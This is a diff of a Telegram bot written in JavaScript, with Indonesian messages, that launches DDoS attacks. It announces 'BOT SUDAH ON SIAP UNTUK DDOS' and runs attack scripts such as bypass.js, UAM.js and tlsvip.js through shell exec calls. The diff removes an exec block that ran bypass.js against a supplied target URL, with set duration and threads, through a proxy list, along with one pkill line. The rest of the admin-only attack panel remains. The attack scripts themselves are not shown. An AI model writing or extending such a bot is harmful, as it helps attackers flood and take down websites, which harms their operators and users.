@@ -55,7 +55,7 @@ bot.sendMessage(adminId, 'BOT SUDAH ON SIAP UNTUK DDOS');
       exec("pkill -f UAM.js");
       exec("pkill -f MIXMAX.js");
       exec("pkill -f tlsvip.js");
-      exec("pkill -f bypassantibot.js");
+  
 
       bot.sendMessage(chatId, 'Berhasil menghentikan file yang sedang berjalan.');
     } else {
@@ -140,17 +140,7 @@ bot.sendMessage(adminId, 'BOT SUDAH ON SIAP UNTUK DDOS');
       });
 
       
-      exec(`node bypass.js ${web} ${time} ${thread} proxy4.txt`, (error, stdout, stderr) => {
-        if (error) {
-          bot.sendMessage(chatId, `Error: ${error.message}`);
-          return;
-        }
-        if (stderr) {
-          bot.sendMessage(chatId, `Error: ${stderr}`);
-          return;
-        }
-        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nThreads: ${thread}`);
-      });
+      
 
     } else {
       bot.sendMessage(chatId, 'Maaf, hanya admin yang dapat menggunakan perintah ini.');
